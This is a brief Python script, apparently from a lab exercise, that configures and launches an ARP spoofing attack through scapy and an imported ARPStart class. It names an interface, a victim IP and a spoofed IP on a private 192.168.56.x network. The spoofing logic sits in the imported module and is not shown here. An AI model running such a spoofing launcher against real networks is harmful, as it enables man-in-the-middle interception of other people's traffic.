from scapy.all import * 
from ARPStart import ARPStart

networkID = "enp0s3"
ipVictim = "192.168.56.101"
ipSpoof = "192.168.56.102"
silentMode = False
arpStart = ARPStart(networkID=networkID, ipVictim=ipVictim, ipSpoof=ipSpoof, silentMode=silentMode)
arpStart.startARP()
